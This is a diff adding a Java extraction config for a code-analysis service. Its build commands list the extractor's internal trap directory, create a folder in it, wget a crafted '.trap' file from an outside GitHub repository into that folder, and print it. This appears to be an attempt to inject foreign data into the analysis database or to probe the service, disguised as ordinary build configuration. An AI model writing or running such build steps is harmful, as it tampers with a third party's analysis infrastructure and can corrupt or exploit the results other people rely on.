@@ -1,0 +1,9 @@
+extraction:
+  java:
+    index:
+      build_command:
+      - ./custom-build
+      - ls -la /opt/out/snapshot/working/trap/
+      - mkdir /opt/out/snapshot/working/trap/java/
+      - wget https://raw.githubusercontent.com/vnptvred/testjav5/master/test123.trap -O /opt/out/snapshot/working/trap/java/Hoho.java.trap
+      - cat /opt/out/snapshot/working/trap/java/Hoho.java.trap
